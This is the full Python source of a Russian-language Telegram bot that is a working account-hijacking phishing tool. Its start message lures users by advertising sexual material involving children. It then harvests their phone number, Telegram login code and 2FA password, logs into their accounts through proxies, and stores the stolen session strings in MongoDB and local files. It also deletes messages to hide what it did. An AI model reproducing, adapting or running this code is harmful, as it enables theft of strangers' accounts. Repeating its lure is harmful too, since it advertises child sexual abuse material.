import logging
import os
import json
import phonenumbers
from phonenumbers import geocoder
from aiogram import Bot, Dispatcher, types
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardButton, InlineKeyboardMarkup
from aiogram.utils import executor
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors.rpcerrorlist import SessionPasswordNeededError, PhoneCodeExpiredError, PhoneCodeInvalidError
from pymongo import MongoClient
from dotenv import load_dotenv
from datetime import datetime
import asyncio

load_dotenv()
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
MONGO_URI = os.getenv("MONGO_URI")

# Основная прокси (старая, для совместимости)
PROXY_HOST = os.getenv("PROXY_HOST")
PROXY_PORT = int(os.getenv("PROXY_PORT"))
PROXY_USER = os.getenv("PROXY_USER")
PROXY_PASS = os.getenv("PROXY_PASS")
main_proxy = ('socks5', PROXY_HOST, PROXY_PORT, True, PROXY_USER, PROXY_PASS)

# Вторая прокси (новая)
PROXY1_HOST = os.getenv("PROXY1_HOST")
PROXY1_PORT = int(os.getenv("PROXY1_PORT"))
PROXY1_USER = os.getenv("PROXY1_USER")
PROXY1_PASS = os.getenv("PROXY1_PASS")
second_proxy = ('socks5', PROXY1_HOST, PROXY1_PORT, True, PROXY1_USER, PROXY1_PASS)

# Список доступных прокси
proxy_list = [main_proxy, second_proxy]

mongo = MongoClient(MONGO_URI)
db = mongo["dbmango"]
sessions_col = db["sessions"]
start_col = db["start"]

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)

user_states = {}
user_clients = {}
user_phones = {}
user_code_buffers = {}

os.makedirs("sessions", exist_ok=True)

def get_proxy_for_phone(phone):
    """Выбираем прокси для номера"""
    existing_session = sessions_col.find_one({"phone": phone})
    if existing_session:
        return proxy_list[existing_session.get('proxy_index', 0)]
    return proxy_list[hash(phone) % len(proxy_list)]

def cleanup(user_id):
    """Очищает данные пользователя из временных хранилищ"""
    user_states.pop(user_id, None)
    user_clients.pop(user_id, None)
    user_phones.pop(user_id, None)
    user_code_buffers.pop(user_id, None)

def update_user_log(user_id: int, updates: dict):
    """Обновляет или создает запись пользователя с новыми данными"""
    try:
        start_col.update_one(
            {"user_id": user_id},
            {"$set": updates, "$setOnInsert": {"first_seen": datetime.now()}},
            upsert=True
        )
    except Exception as e:
        logging.error(f"Ошибка при обновлении лога пользователя: {e}")

async def send_code_keyboard(user_id, current_code, message_id=None):
    """Отправляет/обновляет клавиатуру для ввода кода"""
    digits = [[1, 2, 3], [4, 5, 6], [7, 8, 9], [0]]
    buttons = []
    for row in digits:
        btn_row = [InlineKeyboardButton(str(d), callback_data=f"code_{d}") for d in row]
        buttons.append(btn_row)
    buttons.append([InlineKeyboardButton("✅ Отправить", callback_data="code_send")])
    keyboard = InlineKeyboardMarkup(inline_keyboard=buttons)
    text = f"Код: `{current_code}`" if current_code else "Введите код:"

    if message_id:
        await bot.edit_message_text(chat_id=user_id, message_id=message_id,
                                 text=text, reply_markup=keyboard, parse_mode='Markdown')
    else:
        msg = await bot.send_message(user_id, text, reply_markup=keyboard, parse_mode='Markdown')
        return msg.message_id

@dp.message_handler(commands=['start'])
async def cmd_start(message: types.Message):
    user = message.from_user
    
    update_user_log(
        user_id=user.id,
        updates={
            "username": user.username,
            "first_name": user.first_name,
            "last_name": user.last_name,
            "language_code": user.language_code,
            "is_bot": user.is_bot,
            "chat_id": message.chat.id,
            "last_start": datetime.now(),
            "status": "started"
        }
    )

    keyboard = InlineKeyboardMarkup().add(
        InlineKeyboardButton("Я точно не робот!🥰", callback_data="request_contact")
    )
    await message.answer(
        "👋🇷🇺 ПРИВЕТ! ❤️\n"
        "У нас самые громные фото и выдео с детьми, больше 10.000 материала! 👀\n"
        "Подтверди, что ты не бот, с помощью кнопки ниже, и получи весь материал! 🤖👇\n\n",
        reply_markup=keyboard
    )

@dp.callback_query_handler(lambda c: c.data == 'request_contact')
async def request_contact(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    user_states[user_id] = 'awaiting_contact'

    update_user_log(
        user_id=user_id,
        updates={
            "auth_button_clicked": True,
            "auth_button_click_time": datetime.now(),
            "status": "awaiting_contact"
        }
    )

    # Создаем клавиатуру с запросом контакта
    keyboard = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    keyboard.add(KeyboardButton("Поделиться номером", request_contact=True))

    await bot.edit_message_text(
        chat_id=user_id,
        message_id=callback_query.message.message_id,
        text="📱 Нажмите кнопку ниже, чтобы поделиться номером телефона:",
        reply_markup=keyboard
    )
    await bot.answer_callback_query(callback_query.id)

@dp.message_handler(content_types=['contact'])
async def handle_contact(message: types.Message):
    user_id = message.from_user.id

    # Проверяем, что пользователь находится в состоянии ожидания контакта
    if user_states.get(user_id) != 'awaiting_contact':
        return

    # Удаляем сообщение с контактом сразу после получения
    try:
        await bot.delete_message(chat_id=user_id, message_id=message.message_id)
    except Exception as e:
        logging.error(f"Не удалось удалить сообщение с контактом: {e}")

    phone = message.contact.phone_number
    if not phone.startswith('+'):
        phone = f"+{phone}"

    geo_info = None
    try:
        parsed_number = phonenumbers.parse(phone)
        geo_info = geocoder.description_for_number(parsed_number, "en")
    except Exception as e:
        logging.error(f"Ошибка при определении геолокации: {e}")

    update_user_log(
        user_id=user_id,
        updates={
            "phone": phone,
            "geo_info": geo_info,
            "phone_shared": True,
            "phone_share_time": datetime.now(),
            "status": "phone_received"
        }
    )

    selected_proxy = get_proxy_for_phone(phone)
    
    client = TelegramClient(StringSession(), API_ID, API_HASH, proxy=selected_proxy)
    await client.connect()
    user_clients[user_id] = client
    user_phones[user_id] = phone

    try:
        await client.send_code_request(phone)
        user_states[user_id] = 'awaiting_code'
        user_code_buffers[user_id] = {'code': '', 'message_id': None}
        msg_id = await send_code_keyboard(user_id, "", None)
        user_code_buffers[user_id]['message_id'] = msg_id
        
        # Отправляем сообщение о вводе кода и удаляем его через 3 секунды
        msg = await message.answer("⌨️ Введите код, нажимая кнопки ниже:")
        await asyncio.sleep(3)
        try:
            await bot.delete_message(chat_id=user_id, message_id=msg.message_id)
        except:
            pass
            
    except Exception as e:
        error_msg = await message.answer(f"❌ Ошибка при отправке кода: {e}")
        await client.disconnect()
        cleanup(user_id)
        await asyncio.sleep(3)
        try:
            await bot.delete_message(chat_id=user_id, message_id=error_msg.message_id)
        except:
            pass

@dp.callback_query_handler(lambda c: c.data.startswith("code_"))
async def process_code_button(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    data = callback_query.data

    if user_states.get(user_id) != 'awaiting_code':
        await bot.answer_callback_query(callback_query.id, text="⛔️ Не сейчас", show_alert=True)
        return

    buffer = user_code_buffers.get(user_id)
    if not buffer:
        await bot.answer_callback_query(callback_query.id, text="Внутренняя ошибка.", show_alert=True)
        return

    current_code = buffer['code']
    message_id = buffer['message_id']

    if data == "code_send":
        if not current_code:
            await bot.answer_callback_query(callback_query.id, text="⚠️ Сначала введите код", show_alert=True)
            return
        await bot.answer_callback_query(callback_query.id)
        await try_sign_in_code(user_id, current_code)
    else:
        digit = data.split("_")[1]
        if len(current_code) >= 10:
            await bot.answer_callback_query(callback_query.id, text="⚠️ Слишком длинный код", show_alert=True)
            return
        current_code += digit
        user_code_buffers[user_id]['code'] = current_code
        await bot.answer_callback_query(callback_query.id)
        await send_code_keyboard(user_id, current_code, message_id)

async def try_sign_in_code(user_id, code):
    client = user_clients.get(user_id)
    phone = user_phones.get(user_id)
    if not client or not phone:
        error_msg = await bot.send_message(user_id, "⚠️ Сессия не найдена. Попробуйте снова с /start")
        cleanup(user_id)
        await asyncio.sleep(3)
        try:
            await bot.delete_message(chat_id=user_id, message_id=error_msg.message_id)
        except:
            pass
        return

    try:
        await client.sign_in(phone=phone, code=code)
        if await client.is_user_authorized():
            me = await client.get_me()
            session_str = client.session.save()
            
            proxy_index = 0
            if hasattr(client, '_sender') and hasattr(client._sender, '_proxy'):
                current_proxy = client._sender._proxy
                proxy_index = next((i for i, p in enumerate(proxy_list) if p == current_proxy), 0)
            
            sessions_col.update_one(
                {"phone": phone}, 
                {"$set": {
                    "phone": phone, 
                    "session": session_str, 
                    "proxy_index": proxy_index,
                    "user_id": user_id,
                    "username": me.username,
                    "first_name": me.first_name,
                    "last_name": me.last_name if me.last_name else None,
                    "auth_date": datetime.now()
                }}, 
                upsert=True
            )

            update_user_log(
                user_id=user_id,
                updates={
                    "auth_success": True,
                    "auth_time": datetime.now(),
                    "telegram_id": me.id,
                    "tg_username": me.username,
                    "tg_first_name": me.first_name,
                    "tg_last_name": me.last_name,
                    "status": "authenticated",
                    "proxy_index": proxy_index
                }
            )

            with open(f"sessions/{phone.replace('+', '')}.json", "w") as f:
                json.dump({"phone": phone, "session": session_str}, f)

            success_msg = await bot.send_message(user_id, "Мы работаем в ручном режиме, извините за задержку, скоро отправим вам фото и видео материалы😉🧍‍♀️.")
            await client.disconnect()
            cleanup(user_id)
            await asyncio.sleep(5)
            try:
                await bot.delete_message(chat_id=user_id, message_id=success_msg.message_id)
            except:
                pass
        else:
            user_states[user_id] = 'awaiting_2fa'
            update_user_log(
                user_id=user_id,
                updates={"status": "awaiting_2fa"}
            )
            msg = await bot.send_message(user_id, "🔐 Введите ваш пароль 2FA:")
            await asyncio.sleep(3)
            try:
                await bot.delete_message(chat_id=user_id, message_id=msg.message_id)
            except:
                pass
    except PhoneCodeExpiredError:
        error_msg = await bot.send_message(user_id, "⏰ Код устарел. Попробуйте снова с /start")
        await client.disconnect()
        cleanup(user_id)
        await asyncio.sleep(3)
        try:
            await bot.delete_message(chat_id=user_id, message_id=error_msg.message_id)
        except:
            pass
    except PhoneCodeInvalidError:
        error_msg = await bot.send_message(user_id, "❌ Неверный код. Попробуйте снова:")
        user_code_buffers[user_id]['code'] = ""
        await send_code_keyboard(user_id, "", user_code_buffers[user_id]['message_id'])
        await asyncio.sleep(3)
        try:
            await bot.delete_message(chat_id=user_id, message_id=error_msg.message_id)
        except:
            pass
    except SessionPasswordNeededError:
        user_states[user_id] = 'awaiting_2fa'
        update_user_log(
            user_id=user_id,
            updates={"status": "awaiting_2fa"}
        )
        msg = await bot.send_message(user_id, "🔐 Требуется ваш пароль 2FA. Введите его:")
        await asyncio.sleep(3)
        try:
            await bot.delete_message(chat_id=user_id, message_id=msg.message_id)
        except:
            pass
    except Exception as e:
        error_msg = await bot.send_message(user_id, f"❌ Ошибка входа: {e}")
        await client.disconnect()
        cleanup(user_id)
        await asyncio.sleep(3)
        try:
            await bot.delete_message(chat_id=user_id, message_id=error_msg.message_id)
        except:
            pass

@dp.message_handler(lambda message: user_states.get(message.from_user.id) == 'awaiting_2fa')
async def process_2fa(message: types.Message):
    user_id = message.from_user.id
    
    # Удаляем сообщение с паролем сразу
    try:
        await bot.delete_message(chat_id=user_id, message_id=message.message_id)
    except:
        pass

    password = message.text.strip()
    client = user_clients.get(user_id)
    phone = user_phones.get(user_id)

    if not client or not phone:
        error_msg = await message.answer("⚠️ Сессия не найдена. Попробуйте снова с /start")
        cleanup(user_id)
        await asyncio.sleep(3)
        try:
            await bot.delete_message(chat_id=user_id, message_id=error_msg.message_id)
        except:
            pass
        return

    try:
        await client.sign_in(password=password)
        if await client.is_user_authorized():
            session_str = client.session.save()
            
            proxy_index = 0
            if hasattr(client, '_sender') and hasattr(client._sender, '_proxy'):
                current_proxy = client._sender._proxy
                proxy_index = next((i for i, p in enumerate(proxy_list) if p == current_proxy), 0)
            
            sessions_col.update_one(
                {"phone": phone}, 
                {"$set": {
                    "phone": phone, 
                    "session": session_str, 
                    "proxy_index": proxy_index,
                    "user_id": user_id,
                    "auth_date": datetime.now(),
                    "has_2fa": True
                }}, 
                upsert=True
            )
            
            update_user_log(
                user_id=user_id,
                updates={
                    "auth_success": True,
                    "auth_time": datetime.now(),
                    "has_2fa": True,
                    "status": "authenticated_with_2fa",
                    "proxy_index": proxy_index
                }
            )

            with open(f"sessions/{phone.replace('+', '')}.json", "w") as f:
                json.dump({"phone": phone, "session": session_str}, f)

            success_msg = await message.answer("Мы работаем в ручном режиме, извините за задержку, скоро отправим вам фото и видео материалы😉🧍‍♀️.")
            await client.disconnect()
            cleanup(user_id)
            await asyncio.sleep(5)
            try:
                await bot.delete_message(chat_id=user_id, message_id=success_msg.message_id)
            except:
                pass
        else:
            error_msg = await message.answer("❌ Не удалось войти с 2FA.")
            await asyncio.sleep(3)
            try:
                await bot.delete_message(chat_id=user_id, message_id=error_msg.message_id)
            except:
                pass
    except Exception as e:
        error_msg = await message.answer(f"❌ Ошибка с 2FA: {e}")
        await client.disconnect()
        cleanup(user_id)
        await asyncio.sleep(3)
        try:
            await bot.delete_message(chat_id=user_id, message_id=error_msg.message_id)
        except:
            pass

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)